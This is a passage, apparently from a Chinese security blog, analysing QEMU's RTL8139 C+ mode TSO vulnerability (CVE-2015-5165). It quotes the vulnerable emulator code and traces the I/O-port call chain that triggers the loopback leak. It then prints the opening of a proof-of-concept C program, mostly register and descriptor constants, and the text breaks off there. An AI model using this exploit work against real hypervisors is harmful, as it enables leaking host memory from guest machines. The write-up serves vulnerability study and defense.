class="keyword">uint8_t</span> *data_to_checksum     = eth_payload_data + hlen - <span class="number">12</span>;</span><br><span class="line">        <span class="comment">//                    size_t   data_to_checksum_len = eth_payload_len  - hlen + 12;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* pointer to TCP header */</span></span><br><span class="line">        tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line">        <span class="comment">// 这里利用了上面计算得出的ip_data_len</span></span><br><span class="line">        <span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line">        <span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">&quot;+++ C+ mode TSO IP data len %d TCP hlen %d TCP &quot;</span></span><br><span class="line">                <span class="string">&quot;data len %d TCP chunk size %d\n&quot;</span>, ip_data_len,</span><br><span class="line">                tcp_hlen, tcp_data_len, tcp_chunk_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* note the cycle below overwrites IP header data,</span></span><br><span class="line"><span class="comment">                       but restores it from saved_ip_header before sending packet */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里利用tcp_data_len进行tcp数据包的分片</span></span><br><span class="line">        <span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">            <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">            &#123;</span><br><span class="line">                is_last_frame = <span class="number">1</span>;</span><br><span class="line">                chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO TCP seqno %08x\n&quot;</span>,</span><br><span class="line">                    be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* add 4 TCP pseudoheader fields */</span></span><br><span class="line">            <span class="comment">/* copy IP source and destination fields */</span></span><br><span class="line">            <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO calculating TCP checksum for &quot;</span></span><br><span class="line">                    <span class="string">&quot;packet with %d bytes data\n&quot;</span>, tcp_hlen +</span><br><span class="line">                    chunk_size);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* keep PUSH and FIN flags only for the last frame */</span></span><br><span class="line">            <span class="keyword">if</span> (!is_last_frame)</span><br><span class="line">            &#123;</span><br><span class="line">                TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* recalculate TCP checksum */</span></span><br><span class="line">            ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum;</span><br><span class="line">            p_tcpip_hdr-&gt;zeros      = <span class="number">0</span>;</span><br><span class="line">            p_tcpip_hdr-&gt;ip_proto   = IP_PROTO_TCP;</span><br><span class="line">            p_tcpip_hdr-&gt;ip_payload = cpu_to_be16(tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">            p_tcp_hdr-&gt;th_sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + <span class="number">12</span>);</span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO TCP checksum %04x\n&quot;</span>,</span><br><span class="line">                    tcp_checksum);</span><br><span class="line"></span><br><span class="line">            p_tcp_hdr-&gt;th_sum = tcp_checksum;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* restore IP header */</span></span><br><span class="line">            <span class="built_in">memcpy</span>(eth_payload_data, saved_ip_header, hlen);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* set IP data length and recalculate IP checksum */</span></span><br><span class="line">            ip-&gt;ip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* increment IP id for subsequent frames */</span></span><br><span class="line">            ip-&gt;ip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-&gt;ip_id));</span><br><span class="line"></span><br><span class="line">            ip-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">            ip-&gt;ip_sum = ip_checksum(eth_payload_data, hlen);</span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO IP header len=%d &quot;</span></span><br><span class="line">                    <span class="string">&quot;checksum=%04x\n&quot;</span>, hlen, ip-&gt;ip_sum);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO transferring packet size &quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, tso_send_size);</span><br><span class="line">            <span class="comment">// 将分片后的数据使用rtl8139_transfer_frame进行发送</span></span><br><span class="line">            rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">                                   <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">            p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line">            ++send_count;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Stop sending this frame */</span></span><br><span class="line">        saved_size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数<code>rtl8139_transfer_frame</code>。可以看到如果有<code>TxLoopBack</code>标志的话，会调用<code>rtl8139_do_receive</code>发送给自己。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_transfer_frame</span><span class="params">(RTL8139State *s, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> do_interrupt, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *dot1q_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span class="line">    <span class="keyword">if</span> (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> buf2_size;</span><br><span class="line">        <span class="keyword">uint8_t</span> *buf2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            buf2_size = iov_size(iov, <span class="number">3</span>);</span><br><span class="line">            buf2 = g_malloc(buf2_size);</span><br><span class="line">            iov_to_buf(iov, <span class="number">3</span>, <span class="number">0</span>, buf2, buf2_size);</span><br><span class="line">            buf = buf2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">&quot;+++ transmit loopback mode\n&quot;</span>);</span><br><span class="line">        rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, size, do_interrupt);</span><br><span class="line">        <span class="comment">// .......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞代码触发"><a href="#漏洞代码触发" class="headerlink" title="漏洞代码触发"></a>漏洞代码触发</h3><p>在该设备源码文件下方可以找到设备的<code>TypeInfo</code>和<code>rtl8139_class_init</code>结构体，后者中可以看到引用了<code>pci_rtl8139_realize</code>函数，其中初始化了PMIO和MMIO。通过查看PMIO和MMIO处理函数的调用链，可以发现最终都是调用了以下几个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">rtl8139_io_readb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">rtl8139_io_readw</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">rtl8139_io_readl</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writeb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writew</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writel</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span>;</span><br></pre></td></tr></table></figure>

<p>在<code>rtl8139_io_writeb</code>中，<code>if (val &amp; (1 &lt;&lt; 6))</code>满足，则会调用<code>rtl8139_cplus_transmit</code>，而其中会调用漏洞函数<code>rtl8139_cplus_transmit_one</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rtl8139_cplus_transmit_one</span></span><br><span class="line"><span class="keyword">if</span> (!rtl8139_transmitter_enabled(s))  <span class="comment">// CmdTxEnb</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">&quot;+++ C+ mode: transmitter disabled\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!rtl8139_cp_transmitter_enabled(s))  <span class="comment">// CPlusTxEnb</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">&quot;+++ C+ mode: C+ transmitter disabled\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!(txdw0 &amp; CP_TX_OWN))  <span class="comment">// CP_TX_OWN</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">&quot;C+ Tx mode : descriptor %d is owned by host\n&quot;</span>, descriptor);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (txdw0 &amp; CP_TX_FS)  <span class="comment">// CP_TX_FS</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">&quot;+++ C+ Tx mode : descriptor %d is first segment &quot;</span></span><br><span class="line">            <span class="string">&quot;descriptor\n&quot;</span>, descriptor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reset internal buffer offset */</span></span><br><span class="line">    s-&gt;cplus_txbuffer_offset = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (txdw0 &amp; (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (proto == ETH_P_IP);</span><br><span class="line">    <span class="keyword">if</span> (txdw0 &amp; CP_TX_IPCS);</span><br><span class="line">    <span class="keyword">if</span> ((txdw0 &amp; CP_TX_LGSEN) &amp;&amp; ip_protocol == IP_PROTO_TCP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用链：</p>
<p><code>rtl8139_io_writeb</code>-&gt;<code>rtl8139_cplus_transmit</code>-&gt;<code>rtl8139_cplus_transmit_one</code>-&gt;<code>rtl8139_transfer_frame</code>-&gt;<code>rtl8139_do_receive</code>。</p>
<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>因为没使用kvm，使用的Tiny Code Generator模式执行虚拟机，调试过程中总是接收到SIGUSR1信号，然后中断。在gdbscript中添加以下命令可解。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle SIGUSR1 nostop noprint</span><br></pre></td></tr></table></figure>

<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p><a target="_blank" rel="noopener" href="https://github.com/clxsh/CVE/blob/main/CVE-2015-5165/poc.c">poc.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PRESENT (1ULL &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PFN ((1ULL &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 PMIO base address</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0xC000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + MTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">/* w0 end of ring flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">/* first segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_FS (1&lt;&lt;29)</span></span><br><span class="line"><span class="comment">/* last segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">/* large send packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">/* large send MSS mask, bits 16...25 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">/* UDP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_UDPCS (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* TCP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 bits 0...15 : buffer size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE (1&lt;&lt;16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)</span></span><br><span class="line"><span class="comment">/* w1 add tag flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TAGC (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* w1 bits 0...15 : VLAN tag (big endian) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)</span></span><br><span class="line"><span class="comment">/* w2 low  32bit of Rx buffer ptr */</span></span><br><span class="line"><span class="comment">/* w3 high 32bit of Rx buffer ptr */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set after transmission */</span></span><br><span class="line"><span class="comment">/* FIFO underrun flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_UNF (1&lt;&lt;25)</span></span><br><span class="line"><span class="comment">/* transmit error summary flag, valid if set any of three below */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_TES (1&lt;&lt;23)</span></span><br><span class="line"><span class="comment">/* out-of-window collision flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_OWC (1&lt;&lt;22)</span></span><br><span class="line"><span class="comment">/* link failure flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_LNKF (1&lt;&lt;21)</span></span><br><span class="line"><span class="comment">/* excessive collisions flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_EXC (1&lt;&lt;20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Symbolic offsets to registers. */</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers &#123;</span><br><span class="line">    MAC0 = <span class="number">0</span>,        <span class="comment">/* Ethernet hardware address. */</span></span><br><span class="line">    MAR0 = <span class="number">8</span>,        <span class="comment">/* Multicast filter. */</span></span><br><span class="line">    TxStatus0 = <span class="number">0x10</span>,<span class="comment">/* Transmit status (Four 32bit registers). C mode only */</span></span><br><span class="line">                     <span class="comment">/* Dump Tally Conter control register(64bit). C+ mode 